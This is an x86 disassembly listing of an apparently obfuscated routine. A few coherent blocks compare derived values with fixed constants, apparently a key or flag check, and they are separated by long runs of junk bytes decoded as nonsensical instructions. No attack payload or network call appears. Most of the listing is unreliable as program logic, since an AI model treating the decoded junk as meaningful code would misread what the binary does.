  401933:	xor    eax,DWORD PTR [esi-0x4b]
  401936:	popf   
  401937:	inc    ebp
  401938:	popa   
  401939:	mov    fs,WORD PTR [eax-0x1c2b1161]
  40193f:	jbe    0x4018fe
  401941:	rol    esi,0xfb
  401944:	jle    0x4019c1
  401946:	sub    DWORD PTR [esi-0x646bd1ea],edx
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x687bf628
  401994:	push   eax
  401995:	(bad)  
  401996:	push   0x70707a70
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	mov    edx,0x21ded1f4
  4019a4:	push   eax
  4019a5:	les    ecx,FWORD PTR [eax+eiz*4]
  4019a8:	sub    eax,0xe9423382
  4019ad:	out    dx,eax
  4019ae:	lock lock xchg ebx,eax
  4019b1:	xchg   esi,eax
  4019b2:	outs   dx,BYTE PTR ds:[esi]
  4019b3:	retf   
  4019b4:	cs fs and eax,0x9bf93732
  4019bb:	dec    ebp
  4019bc:	add    al,0x3b
  4019be:	mov    al,0x31
  4019c0:	and    DWORD PTR [eax-0x75],0xffffff8b
  4019c4:	dec    edi
  4019c5:	shr    DWORD PTR [ecx],cl
  4019c7:	pusha  
  4019c8:	mov    ebx,DWORD PTR [ebx-0x399774b9]
  4019ce:	in     al,dx
  4019cf:	cmp    ch,BYTE PTR [ecx]
  4019d1:	push   esp
  4019d2:	iret   
  4019d3:	and    dl,BYTE PTR [ebx]
  4019d5:	imul   esp,DWORD PTR [edx-0x4daf963a],0x76b43e21
  4019df:	push   edi
  4019e0:	push   edx
  4019e1:	in     al,0x21
  4019e3:	mov    ds:0x3fd2c1fb,al
  4019e8:	xor    al,0x93
  4019ea:	fstp   TBYTE PTR [ecx-0xd7c3dd8]
  4019f0:	mov    eax,ds:0x75ff5cda
  4019f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019f6:	mov    edx,DWORD PTR [esi+0x52ad038c]
  4019fc:	jg     0x401a3a
  4019fe:	xchg   ecx,eax
  4019ff:	add    BYTE PTR [eax-0x33],bh
  401a02:	pop    edi
  401a03:	mov    ah,0x7c
  401a05:	sub    dl,BYTE PTR ds:0x8bd4b24e
  401a0b:	aas    
  401a0c:	mov    ebp,0x2f337c4c
  401a11:	mov    ds:0x4a87731,al
  401a16:	loop   0x401a96
  401a18:	jle    0x4019c6
  401a1a:	adc    al,0x23
  401a1c:	hlt    
  401a1d:	mov    eax,0x39ce33e9
  401a22:	into   
  401a23:	xor    ebx,edi
  401a25:	(bad)  
  401a26:	mov    ebx,0xeaf9b8ed
  401a2b:	mov    eax,0x779a8c21
  401a30:	shl    DWORD PTR [ebp-0x61bbc68a],0x2
  401a37:	mov    dh,0xbe
  401a39:	add    dh,BYTE PTR [esp+edi*2-0xe]
  401a3d:	dec    ecx
  401a3e:	in     al,dx
  401a3f:	push   ebx
  401a40:	fisubr WORD PTR [edx+0x6a]
  401a43:	mov    esi,0xd4da0113
  401a48:	popa   
  401a49:	(bad)  
  401a4a:	mov    ebx,0x523ff3b0
  401a4f:	outs   dx,DWORD PTR fs:[esi]
  401a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a52:	mov    al,BYTE PTR [ecx]
  401a54:	pop    ds
  401a55:	xor    bh,ch
  401a57:	je     0x401ab9
  401a59:	rol    ah,cl
  401a5b:	cmp    esp,edx
  401a5d:	ja     0x401aba
  401a5f:	ja     0x401a77
  401a61:	js     0x401a53
  401a63:	sub    dl,ah
  401a65:	mov    esi,0xab4d2090
  401a6a:	in     al,dx
  401a6b:	cmp    eax,0x65d65758
  401a70:	test   al,0x5c
  401a72:	mov    BYTE PTR ss:[ecx-0x608eae9d],dl
  401a79:	sahf   
  401a7a:	gs ins DWORD PTR es:[edi],dx
  401a7c:	xor    eax,0x87ce25fb
  401a81:	push   ss
  401a82:	mov    ecx,0xcc7fe5df
  401a87:	lahf   
  401a88:	pusha  
  401a89:	adc    al,0xa4
  401a8b:	jmp    0xbd68:0x44713a12
  401a92:	dec    esp
  401a93:	out    dx,eax
  401a94:	push   0xe4759039
  401a99:	out    0x40,al
  401a9b:	pushf  
  401a9c:	mov    eax,ds:0xc6a2344
  401aa1:	lea    edx,[ecx-0x6e]
  401aa4:	push   ecx
  401aa5:	cwde   
  401aa6:	add    eax,0x163d757b
  401aab:	adc    cl,BYTE PTR [edi-0x4a]
  401aae:	scas   al,BYTE PTR es:[edi]
  401aaf:	push   eax
  401ab0:	cmp    DWORD PTR [edi+0x7adca0bc],0x8d4a65d
  401aba:	push   esp
  401abb:	aad    0x7e
  401abd:	mov    cl,0x3
  401abf:	mov    ebx,0x1ebbdaf
  401ac4:	loop   0x401af8
  401ac6:	adc    DWORD PTR [ebp-0x2aa68b20],edi
  401acc:	loopne 0x401b29
  401ace:	imul   edi,edx,0x2174fc2d
  401ad4:	push   ecx
  401ad5:	popf   
  401ad6:	xor    DWORD PTR gs:[edx+esi*8-0x59],ebp
  401adb:	das    
  401adc:	iret   
  401add:	stos   BYTE PTR es:[edi],al
  401ade:	call   0x7f8b3625
  401ae3:	dec    ecx
  401ae4:	or     bl,ah
  401ae6:	xchg   DWORD PTR [edx-0x664bee6a],ebx
  401aec:	bound  esp,QWORD PTR [esi]
  401aee:	jno    0x401ab7
  401af0:	data16 xchg BYTE PTR [ebp-0x32],bl
  401af4:	lods   eax,DWORD PTR ds:[esi]
  401af5:	and    esp,esi
  401af7:	inc    ebp
  401af8:	mov    bp,0x31a4
  401afc:	pop    ebx
  401afd:	mov    eax,0x700f7bd
  401b02:	lods   eax,DWORD PTR ds:[esi]
  401b03:	dec    edi
  401b04:	push   0x3f3d5a3c
  401b09:	sub    DWORD PTR [eax-0x7a],esi
  401b0c:	jmp    0x9f9a0c64
  401b11:	fwait
  401b12:	push   ebx
  401b13:	jno    0x401ab1
  401b15:	push   ebp
  401b16:	std    
  401b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b18:	jge    0x401ad2
  401b1a:	rol    DWORD PTR [ebx+0x2d533404],cl
  401b20:	mov    ebx,0x8182d187
  401b25:	loopne 0x401af3
  401b27:	jne    0x401b7b
  401b29:	inc    ebx
  401b2a:	loope  0x401b24
  401b2c:	les    edx,FWORD PTR [edi+0x50c6a2cf]
  401b32:	nop
  401b33:	adc    al,0x72
  401b35:	aaa    
  401b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b37:	add    BYTE PTR [edi-0x61d2f929],al
  401b3d:	dec    esi
  401b3e:	mov    cl,0x2a
  401b40:	lock repnz out 0x70,eax
  401b44:	imul   eax,DWORD PTR [ebp+0x0],0x73ed33c5
  401b4b:	jns    0x401ad1
  401b4d:	adc    BYTE PTR ds:0xa94b3df9,cl
  401b53:	mov    al,ds:0x1e01b02b
  401b58:	mov    al,0x1c
  401b5a:	push   es
  401b5b:	cmp    al,BYTE PTR [edi]
  401b5d:	lods   al,BYTE PTR ds:[esi]
  401b5e:	or     al,0x5
  401b60:	jnp    0x401b74
  401b62:	push   ss
  401b63:	imul   eax,DWORD PTR [ecx+ecx*4],0xffffffeb
  401b67:	cwde   
  401b68:	xchg   edx,eax
  401b69:	xchg   edx,eax
  401b6a:	pop    edi
  401b6b:	or     al,0x23
  401b6d:	push   ecx
  401b6e:	pop    edx
  401b6f:	lods   eax,DWORD PTR ds:[esi]
  401b70:	xchg   edx,ecx
  401b72:	lahf   
  401b73:	jge    0x401b3c
  401b75:	mov    BYTE PTR [esp+eiz*8+0x2b],cl
  401b79:	cmc    
  401b7a:	into   
  401b7b:	push   ss
  401b7c:	sbb    edx,ecx
  401b7e:	leave  
  401b7f:	jle    0x401b5c
  401b81:	outs   dx,DWORD PTR ds:[esi]
  401b82:	sbb    DWORD PTR ds:0x3cc83cd2,eax
  401b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b89:	repz je 0x401b5c
  401b8c:	repnz es dec ebp
  401b8f:	push   ds
  401b90:	jp     0x401b99
  401b92:	in     al,0x1d
  401b94:	xchg   ebp,eax
  401b95:	xor    eax,0xd06c6b26
  401b9a:	gs jno 0x401bfe
  401b9d:	loope  0x401b4d
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,dl
  401bdd:	gs pusha 
  401bdf:	mov    BYTE PTR [eax+0x78],dh
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	retf   
  401be9:	pushf  
  401bea:	outs   dx,BYTE PTR ds:[esi]
  401beb:	mov    al,0x25
  401bed:	dec    ebp
  401bee:	aam    0x85
  401bf0:	fcomp  QWORD PTR [ebp-0xd045526]
  401bf6:	xor    eax,DWORD PTR [edi]
  401bf8:	fimul  WORD PTR [edx]
  401bfa:	dec    ecx
  401bfb:	(bad)  
  401bfc:	lods   al,BYTE PTR ds:[esi]
  401bfd:	(bad)  
  401bff:	stos   BYTE PTR es:[edi],al
  401c00:	cmp    ch,al
  401c02:	jl     0x401b89
  401c04:	xchg   edi,eax
  401c05:	mov    edi,0x51c48473
  401c0a:	cmp    al,0xdf
  401c0c:	dec    edx
  401c0d:	data16 or BYTE PTR [ebp-0x45fa988],0x4d
  401c15:	test   eax,0xa85e6ad9
  401c1a:	jae    0x401bb7
  401c1c:	scas   eax,DWORD PTR es:[edi]
  401c1d:	jnp    0x401c44
  401c1f:	test   DWORD PTR [eax-0x80],0xe4e362c2
  401c26:	or     eax,0xbf8174e2
  401c2b:	push   ds
  401c2c:	mov    DWORD PTR [ebx+0x5d68c9e5],esp
  401c32:	enter  0x3bfb,0x7b
  401c36:	cmp    eax,0x977dad06
  401c3b:	jp     0x401ca7
  401c3d:	sbb    bh,al
  401c3f:	out    dx,al
  401c40:	push   eax
  401c41:	cs cli 
  401c43:	lods   al,BYTE PTR ds:[esi]
  401c44:	rcl    DWORD PTR [edi],0x55
  401c47:	dec    ebp
  401c48:	call   0xb569c577
  401c4d:	pusha  
  401c4e:	mov    esi,ebx
  401c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c51:	je     0x401c9f
  401c53:	fidivr DWORD PTR [ecx]
  401c55:	ins    BYTE PTR es:[edi],dx
  401c56:	jno    0x401cc0
  401c58:	hlt    
  401c59:	cdq    
  401c5a:	push   ds
  401c5b:	sbb    bl,0x70
  401c5e:	out    0xeb,eax
  401c60:	cld    
  401c61:	pop    ss
  401c62:	jno    0x401c29
  401c64:	jmpw   0x1378
  401c68:	mov    bh,0x28
  401c6a:	jmp    0x21ce2cda
  401c6f:	iret   
  401c70:	out    0x80,eax
  401c72:	out    dx,al
  401c73:	fild   QWORD PTR es:[eax+0xc516c77]
  401c7a:	shl    ecx,1
  401c7c:	cld    
  401c7d:	lds    ebp,FWORD PTR [edx+0x6c]
  401c80:	(bad)  
  401c81:	cli    
  401c82:	fisttp QWORD PTR [esi-0x7d913bd9]
  401c88:	cmp    al,0x55
  401c8a:	or     bh,BYTE PTR ds:0x14be9bb
  401c90:	iret   
  401c91:	mov    al,ds:0x5bfce6a6
  401c96:	xor    al,BYTE PTR [ebx+esi*8+0x703e28c]
  401c9d:	ror    DWORD PTR [esi],1
  401c9f:	fmul   st,st(7)
  401ca1:	retf   
  401ca2:	push   edx
  401ca3:	test   DWORD PTR [ecx-0x60155781],0xd47551fb
  401cad:	xchg   ebx,eax
  401cae:	std    
  401caf:	push   cs
  401cb0:	jns    0x401d1b
  401cb2:	in     al,0x30
  401cb4:	popf   
  401cb5:	int3   
  401cb6:	pop    ebp
  401cb7:	xor    ebp,DWORD PTR [esi-0x54d72f6f]
  401cbd:	add    esi,DWORD PTR [edx]
  401cbf:	popf   
  401cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cc1:	fdiv   st(2),st
  401cc3:	adc    al,0xf5
  401cc5:	add    DWORD PTR [esi+0x7c66d2d2],ecx
  401ccb:	(bad)  
  401ccd:	dec    ebx
  401cce:	mov    eax,0x516a7298
  401cd3:	push   ebx
  401cd4:	inc    esp
  401cd5:	(bad)  
  401cd6:	mov    ebp,0xa8d8d997
  401cdb:	mov    eax,0xe2e2990a
  401ce0:	bound  eax,QWORD PTR [edi]
  401ce2:	xchg   esp,eax
  401ce3:	push   edx
  401ce4:	jb     0x401cca
  401ce6:	jne    0x401d43
  401ce8:	call   0x208c:0x4f4ac820
  401cef:	(bad)  
  401cf0:	into   
  401cf1:	arpl   WORD PTR [ecx+0x58b6c841],di
  401cf7:	add    DWORD PTR [edx],eax
  401cf9:	xchg   DWORD PTR [eax-0x70],edx
  401cfc:	inc    esi
  401cfd:	dec    eax
  401cfe:	or     BYTE PTR [ecx+0x603f5f92],bl
  401d04:	cld    
  401d05:	stc    
  401d06:	mov    ecx,0x244b78
  401d0b:	mov    esi,0x2354fce7
  401d10:	jle    0x401d63
  401d12:	jmp    0x4763:0x8a414e92
  401d19:	pop    ebx
  401d1a:	inc    esi
  401d1b:	xchg   edx,eax
  401d1c:	push   edi
  401d1d:	xlat   BYTE PTR ds:[ebx]
  401d1e:	add    eax,0x78dd950d
  401d23:	int    0xc4
  401d25:	inc    esi
  401d26:	push   0x66
  401d28:	iret   
  401d29:	cmp    DWORD PTR [edx+0x27b819bb],ebx
  401d2f:	jb     0x401d5b
  401d31:	int    0xe0
  401d33:	push   ebp
  401d34:	lods   al,BYTE PTR ds:[esi]
  401d35:	push   ebp
  401d36:	pop    edi
  401d37:	and    ebp,DWORD PTR [ebp-0x5f5c9d44]
  401d3d:	outs   dx,BYTE PTR ds:[esi]
  401d3e:	lods   al,BYTE PTR ds:[esi]
  401d3f:	jmp    0x1400366f
  401d44:	push   ds
  401d45:	es or  eax,0x557e3edc
  401d4b:	and    DWORD PTR ds:0xa4153585,0xf
  401d52:	daa    
  401d53:	sbb    edx,ecx
  401d55:	xchg   ebx,eax
  401d56:	imul   esp,DWORD PTR [edi-0xc],0x19
  401d5a:	hlt    
  401d5b:	clc    
  401d5c:	sti    
  401d5d:	mov    ecx,0x866c86d9
  401d62:	pop    edi
  401d63:	repz mov al,0x82
  401d66:	push   0x74
  401d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d69:	push   edi
  401d6a:	test   eax,0x44a99e4f
  401d6f:	pusha  
  401d70:	sub    dl,dl
  401d72:	inc    eax
  401d73:	ret    
  401d74:	(bad)  
  401d75:	stc    
  401d76:	sahf   
  401d77:	lea    edx,[edi+eax*1+0x2a]
  401d7b:	cwde   
  401d7c:	jae    0x401d49
  401d7e:	(bad)  
  401d7f:	jp     0x401d9c
  401d81:	leave  
  401d82:	scas   al,BYTE PTR es:[edi]
  401d83:	mov    ds:0x7e4df987,eax
  401d88:	jae    0x401db7
  401d8a:	rcl    BYTE PTR [ecx+0x53f1a6dd],cl
  401d90:	sar    DWORD PTR ds:0x8d2794f2,0xdb
  401d97:	(bad)  
  401d98:	repnz sub eax,0xe1cc0066
  401d9e:	push   edi
  401d9f:	int3   
  401da0:	xor    eax,DWORD PTR [ebp-0x1d64e664]
  401da6:	test   eax,0x5a685761
  401dab:	adc    BYTE PTR [ebx],dl
  401dad:	scas   eax,DWORD PTR es:[edi]
  401dae:	pop    ebp
  401daf:	shr    BYTE PTR [eax],1
  401db1:	std    
  401db2:	xchg   DWORD PTR [edx],esi
  401db4:	repnz scas al,BYTE PTR es:[edi]
  401db6:	jmp    0xbcab:0xdf8b74b7
  401dbd:	mov    fs,WORD PTR [ecx+edi*1]
  401dc0:	push   ecx
  401dc1:	inc    ebp
  401dc2:	outs   dx,DWORD PTR ds:[esi]
  401dc3:	push   ebx
  401dc4:	(bad)  
  401dc6:	mov    esp,DWORD PTR [esi+0x8]
  401dc9:	call   0x4fcdfdd
  401dce:	dec    esp
  401dcf:	or     BYTE PTR [ecx+ebp*2-0x2aeb5618],dl
  401dd6:	sub    al,0x63
  401dd8:	(bad)  
  401dd9:	mov    esi,0x97b613e5
  401dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ddf:	cli    
  401de0:	mov    edi,0x2a7d13f9
  401de5:	adc    DWORD PTR [ecx],0x30
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esp+ecx*1+0x6e],dl
  401e44:	jnp    0x401e50
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	fadd   st,st(2)
  401e50:	test   eax,0x140f58fd
  401e55:	pop    esi
  401e56:	xor    eax,DWORD PTR [ebx-0x3d]
  401e59:	add    al,0x51
  401e5b:	push   ds
  401e5c:	and    BYTE PTR [edx-0x5e],ch
  401e5f:	mov    al,0x1d
  401e61:	jbe    0x401e73
  401e63:	adc    eax,0xe72d4e1
  401e68:	outs   dx,DWORD PTR ds:[esi]
  401e69:	nop
  401e6a:	test   DWORD PTR [ebx-0x7a759ef8],edi
  401e70:	bound  edx,QWORD PTR [ebx-0x7e]
  401e73:	xchg   ecx,eax
  401e74:	cld    
  401e75:	or     BYTE PTR [ebx],0x5c
  401e78:	mov    dl,0x93
  401e7a:	dec    esi
  401e7b:	ret    0xe12a
  401e7e:	jnp    0x401eb3
  401e80:	xchg   ebx,eax
  401e81:	mov    edi,0x1e4a6fd4
  401e86:	jno    0x401e75
  401e88:	lea    ecx,[eax+0x568716f3]
  401e8e:	test   eax,0xafbfcb74
  401e93:	jno    0x401ed3
  401e95:	push   ecx
  401e96:	fnsetpm(287 only) 
  401e98:	pop    es
  401e99:	and    dh,ch
  401e9b:	call   0xa19a:0x8b825341
  401ea2:	jnp    0x401e7c
  401ea4:	pop    ebp
  401ea5:	push   ecx
  401ea6:	pop    eax
  401ea7:	int3   
  401ea8:	jge    0x401ebc
  401eaa:	jb     0x401f05
  401eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ead:	mov    cl,0x7b
  401eaf:	push   es
  401eb0:	icebp  
  401eb1:	xor    eax,0x1eeb2c92
  401eb6:	push   ds
  401eb7:	cmp    ah,BYTE PTR [ebx-0x2]
  401eba:	add    al,BYTE PTR [esi+0x681fb663]
  401ec0:	icebp  
  401ec1:	pop    ebx
  401ec2:	mov    dh,0xab
  401ec4:	fwait
  401ec5:	pop    ecx
  401ec6:	stos   BYTE PTR es:[edi],al
  401ec7:	mov    dh,BYTE PTR [ebp-0x41e5c25b]
  401ecd:	dec    esp
  401ece:	popa   
  401ecf:	popa   
  401ed0:	in     eax,0x16
  401ed2:	fcom   QWORD PTR [esi-0x3ff35ab4]
  401ed8:	push   ebp
  401ed9:	in     al,0x3a
  401edb:	jb     0x401ef3
  401edd:	(bad)
  401ee0:	sbb    al,BYTE PTR es:[ebx+eax*2+0x70eee1d8]
  401ee8:	in     eax,0xe3
  401eea:	(bad)  
  401eeb:	ins    DWORD PTR es:[edi],dx
  401eec:	cmp    DWORD PTR [esp+edi*4],0x51
  401ef0:	hlt    
  401ef1:	or     al,0xe8
  401ef3:	pop    esp
  401ef4:	sbb    eax,0xb4a012a7
  401ef9:	xchg   DWORD PTR [ecx],esp
  401efb:	mov    esi,esp
  401efd:	sbb    eax,0x1b1a0859
  401f02:	outs   dx,DWORD PTR ds:[esi]
  401f03:	scas   eax,DWORD PTR es:[edi]
  401f04:	push   eax
  401f05:	or     BYTE PTR [esi],dl
  401f07:	jge    0x401f4b
  401f09:	and    al,0xf7
  401f0b:	cli    
  401f0c:	xor    eax,0x60696860
  401f11:	in     al,dx
  401f12:	or     al,0x46
  401f14:	xchg   esi,eax
  401f15:	pop    ss
  401f16:	xchg   ebx,eax
  401f17:	mov    dl,0x51
  401f19:	dec    esp
  401f1a:	icebp  
  401f1b:	out    0x91,al
  401f1d:	mov    ds,WORD PTR [edi+0x2d16ff1]
  401f23:	fst    DWORD PTR [esp+ebx*2-0x3f]
  401f27:	mov    bh,0xd
  401f29:	and    BYTE PTR [edx],0x57
  401f2c:	mov    dh,0xd
  401f2e:	inc    eax
  401f2f:	(bad)  
  401f30:	jmp    0x6fe0:0xdddba8
  401f37:	dec    ebp
  401f38:	fisttp WORD PTR [ebx+0x25]
  401f3b:	out    0x16,al
  401f3d:	bound  edx,QWORD PTR [ebp+0x52af490b]
  401f43:	xor    DWORD PTR [ebx],eax
  401f45:	sub    eax,0xcba28899
  401f4a:	jmp    0x693b3ab5
  401f4f:	cdq    
  401f50:	ja     0x401fa5
  401f52:	sub    al,0x55
  401f54:	jae    0x401f54
  401f56:	dec    edx
  401f57:	ficom  DWORD PTR [eax+ebp*2-0x35]
  401f5b:	jmp    0x401fa5
  401f5d:	cli    
  401f5e:	inc    ecx
  401f5f:	loopne 0x401f36
  401f61:	xchg   edx,eax
  401f62:	repnz ins DWORD PTR es:[edi],dx
  401f64:	aaa    
  401f65:	aad    0x1f
  401f67:	mov    esp,0xfb04432d
  401f6c:	stc    
  401f6d:	je     0x401f5a
  401f6f:	dec    edx
  401f70:	push   edi
  401f71:	stos   BYTE PTR es:[edi],al
  401f72:	loopne 0x401fd0
  401f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f75:	jns    0x401f7a
  401f77:	xchg   DWORD PTR [esi+0x1bf9055d],ebx
  401f7d:	xchg   ebp,eax
  401f7e:	retf   0x8b3
  401f81:	shl    DWORD PTR [edx+0x28],1
  401f84:	and    ebp,DWORD PTR [eax+eiz*1-0x3816d978]
  401f8b:	js     0x401fb8
  401f8d:	pushf  
  401f8e:	in     al,0x29
  401f90:	sbb    eax,0x804ff2df
  401f95:	adc    eax,0x9ff47136
  401f9a:	stos   BYTE PTR es:[edi],al
  401f9b:	in     al,dx
  401f9c:	and    esi,edi
  401f9e:	push   0xc6bed4c4
  401fa3:	call   DWORD PTR [esi+0x485d33f8]
  401fa9:	jne    0x401feb
  401fab:	test   al,0xc4
  401fad:	adc    BYTE PTR es:[esi+0x19c1725e],0x2a
  401fb5:	mov    ebp,0x2bddb456
  401fba:	pop    ss
  401fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fbc:	addr16 repz mov bl,0x65
  401fc0:	sub    edx,edx
  401fc2:	adc    DWORD PTR [edx-0x5e974bdd],edx
  401fc8:	inc    ecx
  401fc9:	scas   al,BYTE PTR es:[edi]
  401fca:	out    0x8d,al
  401fcc:	and    BYTE PTR [eax+0x40cbbbc2],ah
  401fd2:	mov    dh,0xfb
  401fd4:	mov    ah,0xa4
  401fd6:	int    0x44
  401fd8:	imul   ebp,DWORD PTR [edi+0x2d98814e],0x43
  401fdf:	test   al,0xaf
  401fe1:	arpl   bx,ax
  401fe3:	iret   
  401fe4:	pop    ds
  401fe5:	dec    esi
  401fe6:	sbb    al,0x4
  401fe8:	dec    ebp
  401fe9:	mov    ecx,0x3c944542
  401fee:	add    ecx,esi
  401ff0:	in     eax,dx
  401ff1:	fst    DWORD PTR [esi+0x45]
  401ff4:	push   cs
  401ff5:	push   ss
  401ff6:	dec    eax
  401ff7:	pop    ds
  401ff8:	sbb    DWORD PTR [esi+0xc],0x5b
  401ffc:	test   eax,0xadcb4731
  402001:	gs mov al,0x90
  402004:	add    ch,ah
  402006:	or     BYTE PTR [edi-0x38],ah
  402009:	sahf   
  40200a:	mov    ebx,0xc8d862a9
  40200f:	and    esp,DWORD PTR ds:0xd621526d
  402015:	ret    
  402016:	sub    BYTE PTR [edi+0x89a0e7b],bl
  40201c:	in     eax,dx
  40201d:	adc    eax,0x3b00a477
  402022:	shl    esi,cl
  402024:	mul    ch
  402026:	pop    es
  402027:	leave  
  402028:	xor    BYTE PTR [ebp+0x5d8d317],ah
  40202e:	pop    ebx
  40202f:	jo     0x402054
  402031:	fcomp  st(4)
  402033:	pop    eax
  402034:	loop   0x40200e
  402036:	pop    ss
  402037:	(bad)  
  402038:	loope  0x401fda
  40203a:	mov    eax,ds:0x8a4ad86c
  40203f:	jle    0x402044
  402041:	mov    edi,0x57450c64
  402046:	mov    al,ds:0x7adcb3f3
  40204b:	jg     0x4020cb
  40204d:	add    eax,0x8bd8558b
  402052:	adc    ah,BYTE PTR [esi+0x3]
  402055:	(bad)  
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    BYTE PTR [esi],0xc8
  40206c:	sub    dl,BYTE PTR [eax+0x70700470]
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	xchg   BYTE PTR [esi+0x3a0d23a4],dh
  40207c:	and    eax,esi
  40207e:	out    dx,al
  40207f:	push   DWORD PTR [ebx+0xc]
  402082:	cmp    dl,BYTE PTR [esi+0x1c67765]
  402088:	call   0xd6cfcc30
  40208d:	adc    eax,0x42fdc6a0
  402092:	inc    edi
  402093:	(bad)  
  402094:	fdiv   QWORD PTR [edi-0x6e53d1a7]
  40209a:	dec    esp
  40209b:	rol    DWORD PTR [edx+0x4c083336],cl
  4020a1:	pop    eax
  4020a2:	push   esi
  4020a3:	leave  
  4020a4:	loopne 0x402030
  4020a6:	lods   al,BYTE PTR ds:[esi]
  4020a7:	mov    edi,0xa1e0b6d3
  4020ac:	inc    esi
  4020ad:	xchg   ebx,esi
  4020af:	or     eax,eax
  4020b1:	(bad)  
  4020b2:	push   ebp
  4020b3:	jge    0x4020b3
  4020b5:	(bad)  
  4020b6:	fcomp  QWORD PTR [ebp+0x6]
  4020b9:	imul   DWORD PTR [ebx-0x50]
  4020bc:	mov    ebp,0xe68be150
  4020c1:	mov    ebx,DWORD PTR [ebp+0x50]
  4020c4:	mov    al,ds:0x53773ea9
  4020c9:	mov    al,0xef
  4020cb:	out    dx,al
  4020cc:	jecxz  0x402072
  4020ce:	repnz xor edx,DWORD PTR [edx-0x4f]
  4020d2:	hlt    
  4020d3:	jp     0x402058
  4020d5:	ret    0x8107
  4020d8:	repz mov edi,DWORD PTR [eax]
  4020db:	repz xchg esp,eax
  4020dd:	lock cmp ch,dl
  4020e0:	outs   dx,DWORD PTR ds:[esi]
  4020e1:	aam    0x3e
  4020e3:	and    ah,0x4c
  4020e6:	(bad)  
  4020e7:	fidivr DWORD PTR [eax+edi*4+0x77959e64]
  4020ee:	sar    DWORD PTR [edi+0x7376a9e7],1
  4020f4:	pop    edx
  4020f5:	mov    esi,0x9afdd37d
  4020fa:	sub    ch,BYTE PTR [ebx-0x5840a9b]
  402100:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402102:	push   eax
  402103:	mov    esi,0xf21a0ecb
  402108:	xlat   BYTE PTR ds:[ebx]
  402109:	pop    DWORD PTR [edx]
  40210b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40210c:	imul   ebp,edx,0x3ad09abe
  402112:	dec    ecx
  402113:	cwde   
  402114:	clc    
  402115:	ret    
  402116:	push   esp
  402117:	dec    eax
  402118:	cmc    
  402119:	mov    esp,0xbb4a995d
  40211e:	mov    al,0x34
  402120:	popa   
  402121:	mov    eax,ds:0x7344daac
  402126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402127:	adc    eax,0x274ba62e
  40212c:	bound  ebp,QWORD PTR [edi-0x6a6dea36]
